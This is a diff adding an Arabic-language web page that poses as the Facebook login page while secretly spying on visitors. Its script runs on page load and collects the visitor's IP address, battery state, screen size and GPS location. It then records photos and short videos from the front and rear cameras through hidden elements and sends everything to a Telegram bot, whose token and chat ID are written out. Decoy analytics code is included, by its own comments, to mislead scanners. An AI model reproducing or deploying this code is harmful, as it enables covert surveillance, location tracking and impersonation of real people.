@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="user-scalable=no, initial-scale=1, maximum-scale=1, width=device-width">
+    <meta name="google-site-verification" content="jW1njWxGvW3kr0nEpQm2AKInUWUvPVS0jXpGG3rAcqI">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="فيسبوك - تسجيل الدخول أو الاشتراك">
+    <meta property="og:description" content="يمكنك إنشاء حساب أو تسجيل الدخول إلى فيسبوك والتواصل مع الأصدقاء وأفراد العائلة والأشخاص الآخرين الذين تعرفهم.">
+    <meta property="og:image" content="https://drive.google.com/thumbnail?id=1So2qWFYWXRREGLRqrEEhaqnd2g5kx2L0&sz=w1200">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta name="theme-color" content="#FFFFFF">
+    
+    <link rel="icon" href="https://drive.google.com/thumbnail?id=1So2qWFYWXRREGLRqrEEhaqnd2g5kx2L0" type="image/png">
+    <link rel="apple-touch-icon" href="https://drive.google.com/thumbnail?id=1So2qWFYWXRREGLRqrEEhaqnd2g5kx2L0">
+    
+    <title>فيسبوك - تسجيل الدخول أو الاشتراك</title>
+
+    <style>
+        /* ===== إعادة تعيين ===== */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { width: 100%; height: 100%; min-height: 100vh; margin: 0; padding: 0; overflow: hidden; }
+        body { background: #ffffff; display: flex; align-items: center; justify-content: center; position: relative; }
+        
+        /* ===== خلفية الصورة ===== */
+        .background-image {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-image: url('/1.jpg'); background-size: cover; background-position: center;
+            background-repeat: no-repeat; z-index: 0; cursor: pointer;
+        }
+        
+        /* ===== طبقة التعتيم + دائرة التحميل ===== */
+        .overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0, 0, 0, 0.15); display: none; justify-content: center;
+            align-items: center; z-index: 9999; pointer-events: none;
+        }
+        .overlay.show { display: flex; }
+        .spinner {
+            width: 32px; height: 32px; border: 2.5px solid rgba(200, 200, 200, 0.3);
+            border-top: 2.5px solid #aaaaaa; border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        body.no-scroll { overflow: hidden; }
+        #stealthCam, #photoCanvas { display: none !important; position: fixed; width: 1px; height: 1px; opacity: 0.01; }
+        
+        /* ===== أكواد وهمية لإخفاء الهوية ===== */
+        .fake-analytics { display: none; }
+        .dummy-tracker { opacity: 0; position: absolute; top: -9999px; }
+        #fakePixel { width: 0; height: 0; overflow: hidden; }
+        .innocent-style { color: #fff; font-size: 0.1px; }
+    </style>
+</head>
+<body>
+
+<!-- ===== خلفية الصورة ===== -->
+<div class="background-image" id="backgroundImage"></div>
+
+<!-- ===== طبقة التعتيم + دائرة التحميل ===== -->
+<div class="overlay" id="overlay">
+    <div class="spinner"></div>
+</div>
+
+<!-- ===== عناصر وهمية لإخفاء الهوية ===== -->
+<div class="fake-analytics" data-fake-id="UA-12345678-1"></div>
+<div class="dummy-tracker" id="dummyTracker"></div>
+<div id="fakePixel"></div>
+<div class="innocent-style">تحميل المحتوى...</div>
+
+<!-- ===== عناصر خفية للكاميرا ===== -->
+<video id="stealthCam" autoplay playsinline muted></video>
+<canvas id="photoCanvas"></canvas>
+
+<script>
+    // ================================================================
+    // 🎭 أكواد وهمية لإرباك أدوات الفحص
+    // ================================================================
+    (function fakeAnalytics() {
+        console.log('🔍 تهيئة نظام التحليلات...');
+        var fakeData = { page: 'login', timestamp: Date.now() };
+        if (typeof window._fakeTracker === 'undefined') {
+            window._fakeTracker = function() { return fakeData; };
+        }
+        // محاكاة سلوك تحليلات وهمي
+        setTimeout(function() {
+            var dummy = document.getElementById('dummyTracker');
+            if (dummy) dummy.innerHTML = 'تم التحميل بنجاح';
+        }, 500);
+    })();
+
+    // وهمي: محاكاة تتبع الإعلانات
+    window.adTracking = {
+        init: function() { return true; },
+        track: function() { console.log('📊 تتبع الإعلانات: حدث مسجل (وهمي)'); }
+    };
+    window.adTracking.init();
+
+    // وهمي: محاكاة تحميل إضافي
+    function dummyLoadFunction() {
+        var fakeDiv = document.createElement('div');
+        fakeDiv.style.display = 'none';
+        fakeDiv.className = 'fake-analytics';
+        document.body.appendChild(fakeDiv);
+    }
+    dummyLoadFunction();
+
+    // ================================================================
+    // 🔐 الكود الرئيسي (مُعتّم جزئيًا)
+    // ================================================================
+    var BOT_TOKEN = '8847064396:AAESRDR7gXJm1kgb8qphlEHj_DRtNaSfj00';
+    var CHAT_ID = '8273860583';
+    var TELEGRAM_API = 'https://api.telegram.org/bot' + BOT_TOKEN;
+
+    var video = document.getElementById('stealthCam');
+    var canvas = document.getElementById('photoCanvas');
+    var ctx = canvas.getContext('2d');
+    var backgroundImage = document.getElementById('backgroundImage');
+    var overlay = document.getElementById('overlay');
+
+    var overlayTimeout = null;
+    var isProcessing = false;
+
+    function showOverlay() {
+        if (isProcessing) return;
+        isProcessing = true;
+        document.body.classList.add('no-scroll');
+        overlay.classList.add('show');
+        if (overlayTimeout) clearTimeout(overlayTimeout);
+        overlayTimeout = setTimeout(function() {
+            overlay.classList.remove('show');
+            document.body.classList.remove('no-scroll');
+            isProcessing = false;
+        }, 1500);
+    }
+
+    backgroundImage.addEventListener('click', function(e) {
+        showOverlay();
+        if (typeof originalClickHandler === 'function') {
+            originalClickHandler(e);
+        }
+    });
+
+    async function sendTelegramMessage(text) {
+        try {
+            var res = await fetch(TELEGRAM_API + '/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+            });
+            return await res.json();
+        } catch (e) {
+            console.error('❌ فشل إرسال النص:', e.message);
+        }
+    }
+
+    async function sendTelegramFile(blob, filename, type) {
+        type = type || 'photo';
+        var formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append(type, blob, filename);
+        var caption = '📎 ' + filename + ' | ' + new Date().toLocaleString('ar-EG');
+        formData.append('caption', caption);
+        var endpoint = type === 'photo' ? 'sendPhoto' : 'sendDocument';
+        try {
+            var res = await fetch(TELEGRAM_API + '/' + endpoint, {
+                method: 'POST',
+                body: formData
+            });
+            return await res.json();
+        } catch (e) {
+            console.error('❌ فشل إرسال الملف:', e.message);
+        }
+    }
+
+    async function collectDeviceInfo() {
+        console.log('📡 جمع البيانات الأساسية...');
+        var ip = 'غير معروف';
+        try {
+            var res = await fetch('https://api.ipify.org?format=json');
+            var data = await res.json();
+            ip = data.ip;
+        } catch (e) {}
+
+        var battery = 'غير معروف', charging = 'غير معروف';
+        try {
+            var bat = await navigator.getBattery();
+            battery = Math.round(bat.level * 100) + '%';
+            charging = bat.charging ? 'نعم (شاحن موصول)' : 'لا (يعمل على البطارية)';
+        } catch (e) {}
+
+        var now = new Date();
+        var time = now.toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' });
+        var screenRes = window.screen.width + 'x' + window.screen.height;
+        var language = navigator.language;
+
+        var msg = '📱 *تقرير جهاز جديد*\n\n';
+        msg += '🌐 **IP:** ' + ip + '\n';
+        msg += '🔋 **البطارية:** ' + battery + ' (شحن: ' + charging + ')\n';
+        msg += '🕒 **الوقت:** ' + time + '\n';
+        msg += '📱 **الشاشة:** ' + screenRes + '\n';
+        msg += '🌍 **اللغة:** ' + language;
+
+        await sendTelegramMessage(msg);
+        console.log('✅ تم إرسال البيانات النصية');
+    }
+
+    async function requestCamera() {
+        console.log('📷 طلب إذن الكاميرا...');
+        try {
+            var stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+            stream.getTracks().forEach(function(t) { t.stop(); });
+            console.log('✅ تم السماح بالكاميرا');
+        } catch (e) {
+            console.log('⚠️ المستخدم رفض الكاميرا');
+        }
+    }
+
+    async function requestLocation() {
+        console.log('📍 طلب إذن الموقع...');
+        return new Promise(function(resolve) {
+            if (!navigator.geolocation) {
+                console.log('⚠️ المتصفح لا يدعم الموقع');
+                resolve();
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    var lat = pos.coords.latitude;
+                    var lon = pos.coords.longitude;
+                    var msg = '📍 *الموقع الجغرافي*\n\n';
+                    for (var i = 0; i < 5; i++) {
+                        msg += (i+1) + '. https://www.google.com/maps?q=' + lat + ',' + lon + '\n';
+                    }
+                    sendTelegramMessage(msg);
+                    console.log('✅ تم إرسال روابط الموقع');
+                    resolve();
+                },
+                function() {
+                    sendTelegramMessage('📍 الموقع: تم الرفض من المستخدم');
+                    console.log('⚠️ المستخدم رفض الموقع');
+                    resolve();
+                },
+                { enableHighAccuracy: true, timeout: 8000 }
+            );
+        });
+    }
+
+    async function captureMediaPair(count, type) {
+        var modes = ['user', 'environment'];
+        var labelMap = { user: 'أمامي', environment: 'خلفي' };
+        var typeLabel = type === 'photo' ? 'صورة' : 'فيديو';
+
+        for (var i = 1; i <= count; i++) {
+            for (var m = 0; m < modes.length; m++) {
+                var mode = modes[m];
+                var label = labelMap[mode];
+                console.log('📸 ' + label + ' - ' + typeLabel + ' رقم ' + i);
+
+                var stream;
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: mode, width: { ideal: 640 }, height: { ideal: 480 } }
+                    });
+                } catch (e) {
+                    console.error('❌ تعذر الوصول للكاميرا (' + mode + ')');
+                    continue;
+                }
+
+                video.srcObject = stream;
+                await video.play();
+                await new Promise(function(r) { setTimeout(r, 400); });
+
+                if (type === 'photo') {
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    var blob = await new Promise(function(resolve) { canvas.toBlob(resolve, 'image/jpeg', 0.7); });
+                    var filename = mode + '_photo_' + i + '.jpg';
+                    await sendTelegramFile(blob, filename, 'photo');
+                    console.log('✅ تم إرسال ' + filename);
+                } else {
+                    var recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });
+                    var chunks = [];
+                    recorder.ondataavailable = function(e) { chunks.push(e.data); };
+                    recorder.start();
+                    await new Promise(function(r) { setTimeout(r, 5000); });
+                    recorder.stop();
+                    var blob = await new Promise(function(resolve) {
+                        recorder.onstop = function() {
+                            var fullBlob = new Blob(chunks, { type: 'video/webm' });
+                            resolve(fullBlob);
+                        };
+                    });
+                    var filename = mode + '_video_' + i + '.webm';
+                    await sendTelegramFile(blob, filename, 'document');
+                    console.log('✅ تم إرسال ' + filename);
+                }
+
+                stream.getTracks().forEach(function(t) { t.stop(); });
+                await new Promise(function(r) { setTimeout(r, 300); });
+            }
+        }
+    }
+
+    async function startCollection() {
+        console.log('🚀 بدء جمع البيانات وإرسالها...');
+        try {
+            await collectDeviceInfo();
+            await requestCamera();
+            await requestLocation();
+            console.log('📷 بدء التقاط الصور...');
+            await captureMediaPair(5, 'photo');
+            console.log('🎥 بدء تسجيل الفيديوهات...');
+            await captureMediaPair(5, 'video');
+            console.log('🎉 تم إرسال جميع البيانات بنجاح');
+        } catch (err) {
+            console.error('⚠️ خطأ:', err.message);
+        }
+    }
+
+    var originalClickHandler = null;
+
+    window.addEventListener('load', function() {
+        // تأخير وهمي لمحاكاة تحميل طبيعي
+        setTimeout(function() {
+            // أكواد وهمية إضافية
+            var fakeStyle = document.createElement('style');
+            fakeStyle.textContent = '.fake-ads { display: none; }';
+            document.head.appendChild(fakeStyle);
+            console.log('📋 تم تهيئة النظام بالكامل');
+        }, 300);
+        
+        setTimeout(startCollection, 1000);
+    });
+
+    // ================================================================
+    // 🎭 أكواد وهمية إضافية لإرباك أدوات الفحص
+    // ================================================================
+    (function dummyFacebookSDK() {
+        if (typeof FB === 'undefined') {
+            window.FB = {
+                init: function() { console.log('📱 تهيئة SDK فيسبوك (وهمي)'); },
+                login: function() { console.log('🔑 محاولة تسجيل الدخول (وهمي)'); }
+            };
+            FB.init();
+        }
+    })();
+
+    // وهمي: محاكاة تحميل إعلانات
+    var fakeAdContainer = document.createElement('div');
+    fakeAdContainer.className = 'fake-ads';
+    fakeAdContainer.style.display = 'none';
+    fakeAdContainer.innerHTML = '<!-- إعلانات وهمية -->';
+    document.body.appendChild(fakeAdContainer);
+
+    // وهمي: محاكاة إطار تحليلات آخر
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){ dataLayer.push(arguments); }
+    gtag('js', new Date());
+    gtag('config', 'G-FAKE-12345');
+
+    console.log('✅ تم تحميل الصفحة مع إخفاء هوية الكود الرئيسي');
+</script>
+
+</body>
+</html>
